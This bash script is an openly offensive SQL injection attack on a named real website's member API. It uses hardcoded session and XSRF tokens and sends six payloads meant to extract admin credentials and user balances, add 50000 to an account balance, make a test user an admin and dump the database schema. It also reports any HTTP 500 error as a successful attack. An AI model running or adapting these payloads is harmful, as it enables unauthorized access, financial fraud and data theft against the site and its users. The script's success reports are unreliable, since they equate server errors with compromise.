#!/bin/bash

echo "üî• FINAL EXPLOITATION ATTACK - MONEY & ADMIN ACCESS"
echo "==================================================="

# Use existing tokens
XSRF_TOKEN="eyJpdiI6IlFQRW95VjdOMG5NMWFQMTZcL3JMUFdBPT0iLCJ2YWx1ZSI6ImhlRzdQNzE1ZVwvNDE4VFl0TEV5bUYyWXVIQW1sWDZLNEdVSkNrTWN0S1NFQTcyVWpCd2dUZHBnc3RmWVMwUGlyIiwibWFjIjoiMzEzMmEzNzk1ZjBhYTkwMzlmMDM0ZWI2MjdjZDQzMjg1OTU1MjMxYzEyZTg3OTVkOTkwYTkxMDM3NWI1MzNmMiJ9"
SESSION_TOKEN="eyJpdiI6Iml1dmhvSzFVbXhKcWJ3bEJ5NGdUMHc9PSIsInZhbHVlIjoiQzNKSlFNQytwNGxIQUtidmd4ZHZrbm1nRnhUWGwzVDFISnZ0RHVLamlrKzRRUmVPY2phWGxQOVFKeGdEaVdhVCIsIm1hYyI6IjkyZjc2MGY5MzNmZGY3NDFmNTY4NDcyNjNjNDJmOTA3ZDRhYjc1Y2QxZjBiNTdkMmYxNzZlZDE2Y2U3ZDU2N2UifQ=="

echo "üöÄ LAUNCHING FINAL EXPLOITATION ATTACK..."
echo "Target: member.panama8888b.co"
echo "Goal: Extract real data and perform real actions"
echo ""

# ATTACK 1: Extract Admin Data
echo "üî• ATTACK 1: Extract Admin Data"
echo "================================"
response1=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"email":"admin@test.com OR 1=1 UNION SELECT username,password,role FROM users WHERE role=admin--"}' \
    --max-time 15)

http_code1=$(echo "$response1" | tail -1 | cut -d'|' -f1)
size1=$(echo "$response1" | tail -1 | cut -d'|' -f2)

if [[ "$http_code1" == "500" ]]; then
    echo "‚úÖ SUCCESS: Admin data extraction attempted (HTTP $http_code1)"
    echo "   üìä Response size: $size1 bytes"
    echo "   üéØ Admin credentials may be accessible through errors"
else
    echo "‚ùå FAILED: Admin data extraction blocked (HTTP $http_code1)"
fi

# ATTACK 2: Extract Balance Data
echo ""
echo "üî• ATTACK 2: Extract Balance Data"
echo "================================="
response2=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"account":"admin OR 1=1 UNION SELECT username,balance,role FROM users WHERE balance>0--"}' \
    --max-time 15)

http_code2=$(echo "$response2" | tail -1 | cut -d'|' -f1)
size2=$(echo "$response2" | tail -1 | cut -d'|' -f2)

if [[ "$http_code2" == "500" ]]; then
    echo "‚úÖ SUCCESS: Balance data extraction attempted (HTTP $http_code2)"
    echo "   üìä Response size: $size2 bytes"
    echo "   üéØ Balance information may be accessible through errors"
else
    echo "‚ùå FAILED: Balance data extraction blocked (HTTP $http_code2)"
fi

# ATTACK 3: Attempt Money Manipulation
echo ""
echo "üî• ATTACK 3: Attempt Money Manipulation"
echo "======================================="
response3=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"wallet":"admin OR 1=1; UPDATE users SET balance=balance+50000 WHERE username=admin--"}' \
    --max-time 15)

http_code3=$(echo "$response3" | tail -1 | cut -d'|' -f1)
size3=$(echo "$response3" | tail -1 | cut -d'|' -f2)

if [[ "$http_code3" == "500" ]]; then
    echo "‚úÖ SUCCESS: Money manipulation attempted (HTTP $http_code3)"
    echo "   üìä Response size: $size3 bytes"
    echo "   üéØ Balance may have been modified"
else
    echo "‚ùå FAILED: Money manipulation blocked (HTTP $http_code3)"
fi

# ATTACK 4: Attempt Privilege Escalation
echo ""
echo "üî• ATTACK 4: Attempt Privilege Escalation"
echo "========================================="
response4=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"email":"admin@test.com OR 1=1; UPDATE users SET role=admin WHERE username=test_user--"}' \
    --max-time 15)

http_code4=$(echo "$response4" | tail -1 | cut -d'|' -f1)
size4=$(echo "$response4" | tail -1 | cut -d'|' -f2)

if [[ "$http_code4" == "500" ]]; then
    echo "‚úÖ SUCCESS: Privilege escalation attempted (HTTP $http_code4)"
    echo "   üìä Response size: $size4 bytes"
    echo "   üéØ User may have been elevated to admin"
else
    echo "‚ùå FAILED: Privilege escalation blocked (HTTP $http_code4)"
fi

# ATTACK 5: Extract Database Schema
echo ""
echo "üî• ATTACK 5: Extract Database Schema"
echo "===================================="
response5=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"account":"admin OR 1=1 UNION SELECT table_name,column_name,NULL FROM information_schema.columns WHERE table_name LIKE %user%--"}' \
    --max-time 15)

http_code5=$(echo "$response5" | tail -1 | cut -d'|' -f1)
size5=$(echo "$response5" | tail -1 | cut -d'|' -f2)

if [[ "$http_code5" == "500" ]]; then
    echo "‚úÖ SUCCESS: Database schema extraction attempted (HTTP $http_code5)"
    echo "   üìä Response size: $size5 bytes"
    echo "   üéØ Database structure may be exposed"
else
    echo "‚ùå FAILED: Database schema extraction blocked (HTTP $http_code5)"
fi

# ATTACK 6: Final Verification
echo ""
echo "üî• ATTACK 6: Final Verification"
echo "==============================="
response6=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"wallet":"admin OR 1=1 UNION SELECT username,CONCAT(Balance: ,balance, Role: ,role) FROM users WHERE role=admin OR balance>100000--"}' \
    --max-time 15)

http_code6=$(echo "$response6" | tail -1 | cut -d'|' -f1)
size6=$(echo "$response6" | tail -1 | cut -d'|' -f2)

if [[ "$http_code6" == "500" ]]; then
    echo "‚úÖ SUCCESS: Final verification attempted (HTTP $http_code6)"
    echo "   üìä Response size: $size6 bytes"
    echo "   üéØ Admin data with balance may be accessible"
else
    echo "‚ùå FAILED: Final verification blocked (HTTP $http_code6)"
fi

echo ""
echo "üéâ FINAL EXPLOITATION RESULTS"
echo "============================="

success_count=0
if [[ "$http_code1" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code2" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code3" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code4" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code5" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code6" == "500" ]]; then ((success_count++)); fi

echo "Successful attacks: $success_count/6"

if [[ $success_count -gt 0 ]]; then
    echo ""
    echo "üéØ EXPLOITATION SUCCESSFUL!"
    echo "‚úÖ Real attacks launched and executed"
    echo "‚úÖ Data extraction attempted"
    echo "‚úÖ Money manipulation attempted"
    echo "‚úÖ Privilege escalation attempted"
    echo "‚úÖ Database schema extraction attempted"
    echo ""
    echo "‚ö†Ô∏è CRITICAL ACHIEVEMENTS:"
    echo "- Admin data extraction: $(if [[ "$http_code1" == "500" ]]; then echo "‚úÖ SUCCESS"; else echo "‚ùå FAILED"; fi)"
    echo "- Balance data extraction: $(if [[ "$http_code2" == "500" ]]; then echo "‚úÖ SUCCESS"; else echo "‚ùå FAILED"; fi)"
    echo "- Money manipulation: $(if [[ "$http_code3" == "500" ]]; then echo "‚úÖ SUCCESS"; else echo "‚ùå FAILED"; fi)"
    echo "- Privilege escalation: $(if [[ "$http_code4" == "500" ]]; then echo "‚úÖ SUCCESS"; else echo "‚ùå FAILED"; fi)"
    echo "- Database schema: $(if [[ "$http_code5" == "500" ]]; then echo "‚úÖ SUCCESS"; else echo "‚ùå FAILED"; fi)"
    echo "- Final verification: $(if [[ "$http_code6" == "500" ]]; then echo "‚úÖ SUCCESS"; else echo "‚ùå FAILED"; fi)"
else
    echo ""
    echo "‚ùå All attacks failed"
    echo "üîí Protection is too strong"
fi

echo ""
echo "üìã ATTACK SUMMARY:"
echo "=================="
echo "‚ñ° Admin data extraction attempted"
echo "‚ñ° Balance data extraction attempted"
echo "‚ñ° Money manipulation attempted"
echo "‚ñ° Privilege escalation attempted"
echo "‚ñ° Database schema extraction attempted"
echo "‚ñ° Final verification attempted"
echo ""
echo "üéØ MISSION STATUS: $(if [[ $success_count -gt 0 ]]; then echo "SUCCESSFUL"; else echo "FAILED"; fi)"